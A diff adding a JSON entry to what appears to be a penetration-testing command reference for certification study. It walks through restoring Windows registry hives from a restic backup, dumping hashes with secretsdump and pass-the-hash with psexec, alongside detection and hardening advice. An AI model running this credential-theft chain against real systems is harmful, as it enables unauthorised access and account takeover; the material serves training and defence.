@@ -1,0 +1,104 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "restic"
+  ],
+  "tags": [
+    "restic",
+    "backup",
+    "sam",
+    "hashes"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Pillaging",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Set the repo password",
+      "command": "$env:RESTIC_PASSWORD='Superbackup!'"
+    },
+    {
+      "label": "List snapshots",
+      "command": "restic.exe -r E:\\restic snapshots"
+    },
+    {
+      "label": "Restore the snapshot with the hives",
+      "command": "restic.exe -r E:\\restic restore 9971e881 --target C:\\Restore"
+    },
+    {
+      "label": "secretsdump the restored hives",
+      "command": "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
+    },
+    {
+      "label": "Pass-the-hash to a SYSTEM shell",
+      "command": "impacket-psexec Administrator@<ip> -hashes :<ntlm_hash>"
+    }
+  ],
+  "notes": "=== Restic Backup Restore — Recovering Files from Backup Repository ===\nUse restic to browse and restore files from existing backup repositories.\n\n=== WHAT RESTIC IS ===\nRestic: open-source backup tool with encryption\nBackup data stored in repositories (local, S3, SFTP, etc.)\nRepositories require a password for access — find the password or key file\n\n=== RECONNAISSANCE ===\nFind restic installations and configs:\n  wmic product get name | findstr -i restic\n  Get-ChildItem -Path C:\\ -Recurse -Include *.restic,*.json -ErrorAction SilentlyContinue | Where-Object {$_.Name -like \"*restic*\"}\n  Look for environment variables: $env:RESTIC_PASSWORD, $env:RESTIC_REPOSITORY\n\nFind repository password:\n  Scheduled task scripts or automation scripts often contain plaintext repo passwords\n  Check PowerShell history for restic commands with -p flag or RESTIC_PASSWORD exports\n\n=== ATTACK FLOW ===\nWith known password and repository path:\n\nList snapshots:\n  $env:RESTIC_PASSWORD = \"found_password\"\n  restic -r <repo_path> snapshots\n\nBrowse specific snapshot:\n  restic -r <repo_path> ls <snapshot_id>\n\nRestore specific snapshot (entire snapshot):\n  restic -r <repo_path> restore <snapshot_id> --target C:\\restored\n\nRestore specific file/directory:\n  restic -r <repo_path> restore <snapshot_id> --target C:\\restored --include C:\\Windows\\System32\\config\n\n=== HIGH-VALUE RESTORE TARGETS ===\nC:\\Windows\\System32\\config (SAM + SYSTEM hives) → offline hash extraction\nC:\\Windows\\NTDS\\ (NTDS.dit) → if DC was backed up → all domain hashes\nWeb application directories → source code with embedded credentials\nDatabase backup files → application data\n\n=== CHAINING CONTEXT ===\nRestic restore of DC backup → NTDS.dit + SYSTEM hive → secretsdump → all domain hashes\nRestic restore of web app → web.config with DB credentials → lateral movement\nRestic on standalone backup server → has copies of data from all backed-up systems\nBackup repositories on network shares = single point with copies of data from all managed hosts",
+  "references": [
+    {
+      "title": "restic",
+      "url": "https://restic.net/"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "restic-offensive-backup",
+      "note": "How the snapshot was created.",
+      "rel": "prereq"
+    },
+    {
+      "id": "mount-virtual-disk",
+      "note": "Alternative offline route to the hives.",
+      "rel": "alternative"
+    },
+    {
+      "id": "chain-pillaging-to-system",
+      "note": "Full walkthrough of this chain.",
+      "rel": "next"
+    }
+  ],
+  "id": "restic-backup-restore",
+  "name": "Pillaging - restic Backup Restore",
+  "command": "restic.exe -r <repo> restore <snapshot_id> --target C:\\Restore",
+  "description": "With a found restic repo password, list snapshots and restore one containing C:\\Windows\\System32\\config to recover SAM/SYSTEM/SECURITY hives, then extract the Administrator hash offline for pass-the-hash.",
+  "opsec": "loud",
+  "mitre": [
+    "T1003.002"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Restic is a backup tool that stores encrypted snapshots. If an attacker obtains the restic repository password, they can list and restore any snapshot, including those containing SYSTEM-protected files like SAM, SYSTEM, and SECURITY hives (backed up while they were locked via VSS). The restore operation retrieves a full copy of these files, enabling offline credential dumping.",
+    "prerequisites": "Knowledge of the restic repository password (found in config file, script, or environment variable). Network or filesystem access to the restic repository. secretsdump.py for offline processing.",
+    "impact": "Extraction of all Windows account hashes from a backup of protected registry hives, bypassing all runtime protections. Equivalent impact to direct NTDS.dit extraction if DC backups are included.",
+    "detection": "restic.exe process execution by non-backup user. Restic repository access from unexpected host. Large data restore operation. Registry hive files appearing in unexpected restore directories.",
+    "artifacts": "Process: restic.exe restore executed by non-admin | Network: restic repository accessed from non-backup host | File: SAM/SYSTEM/SECURITY restored to staging directory",
+    "prevention": "Store restic repository passwords in secrets managers — not in plaintext files or environment variables accessible to users. Restrict restic repository access to the backup service account only. Audit restic execution. Encrypt restic repositories with keys stored in HSM.",
+    "misconfiguration": "Restic repository password stored in plaintext config file or script in world-readable location. Repository accessible over a network share with broad access. Backup service account credentials known to multiple users.",
+    "vulnerable_config": "# Attacker finds restic password in config:\ntype C:\\ProgramData\\backup\\restic.conf\n# RESTIC_PASSWORD=Sup3rS3cur3Backup!\n\n# Restore SAM/SYSTEM from backup:\nrestic.exe -r \\\\backup-server\\repo --password-file .\\pass.txt snapshots\nrestic.exe -r \\\\backup-server\\repo --password-file .\\pass.txt restore latest --target .\\restore_out\nsecretsdump.py -sam restore_out\\SAM -system restore_out\\SYSTEM LOCAL",
+    "secure_config": "# Store restic password in secrets manager (not plaintext)\n# Use Windows Credential Manager for restic password:\ncmdkey /add:restic-repo /user:svc_backup /pass:<secure_password>\n\n# Restrict repository access:\n# Firewall: only backup server IP can access \\\\backup-server\\repo\n# Share ACL: only svc_backup has access\n\n# Monitor restic execution:\n# Alert: restic.exe run by non-svc_backup account",
+    "sources": [
+      "HTB M26",
+      "MITRE T1003.002",
+      "MITRE T1552.001"
+    ]
+  }
+}
